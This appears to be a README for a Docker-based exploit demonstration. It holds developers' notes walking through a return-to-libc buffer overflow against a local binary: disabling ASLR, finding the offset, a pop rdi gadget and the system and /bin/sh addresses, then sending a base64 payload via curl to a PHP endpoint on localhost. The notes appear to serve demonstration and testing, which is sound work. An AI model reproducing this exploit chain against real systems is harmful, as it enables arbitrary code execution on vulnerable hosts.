# c-exploit

## Build

```
pv build docker
docker run -it --rm --privileged -p 8080:80 --name c-exploit polyverse/c-exploit
```
## NOTES FROM ROYs LAPTOP
```
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space

# Determine offset of return address
gdb ./overflow
pattern_arg 100
gdb-peda$ run
gdb-peda$ x/wx $rsp
0x7fffffffe758:	0x41414341
gdb-peda$ pattern_offset 0x41414341
1094796097 found at offset: 17

# Find a "pop rdi" gadget
gdb-peda$ ropsearch "pop rdi"
Searching for ROP gadget: 'pop rdi' in: binary ranges
0x00400a03 : (5fc3)	pop rdi; ret

# Find "/bin/sh" somewhere
gdb-peda$ searchmem "/bin/sh"
Searching for '/bin/sh' in: None ranges
Found 1 results, display max 1 items:
libc : 0x7ffff7b943e8 --> 0x68732f6e69622f ('/bin/sh')

# (Optional) Find "uname" somewhere
gdb-peda$ searchmem "uname" 
Searching for 'uname' in: None ranges
Found 1 results, display max 1 items:
libc : 0x7ffff7a47031 --> 0x636c00656d616e75 ('uname')

# Find the "system" call
gdb-peda$ print system
$1 = {<text variable, no debug info>} 0x7ffff7a72490 <__libc_system>

# Build the payload
python payload.py 17 0x00400a03 0x7ffff7a47031 0x7ffff7a72490 > payload
cat payload | base64 > payload64
(Add a "=" to the end of payload64)

# Test locally
./overflow $(cat payload64)
# Or
gdb ./overflow
break main
run $(cat payload64)
c

# Test remotely
curl localhost/index.php?q=QUFBQUFBQUFBQUFBQUFBQUEDCkAAAAAAADFwpPf/fwAAkCSn9/9/AAAK=
```

## NOTES FROM CHRIS' LAPTOP
```
gdb-peda$ print system
$8 = {<text variable, no debug info>} 0x7ffff7a72490 <__libc_system>

gdb-peda$ searchmem "/bin/sh"
Searching for '/bin/sh' in: None ranges
Found 1 results, display max 1 items:
libc : 0x7ffff7b943e8 --> 0x68732f6e69622f ('/bin/sh')

gdb-peda$ ropsearch "pop rdi"
Searching for ROP gadget: 'pop rdi' in: binary ranges
0x00400673 : (5fc3)	pop rdi; ret
```

 - From Mariusz: https://www.offensive-security.com/metasploit-unleashed/writing-an-exploit/
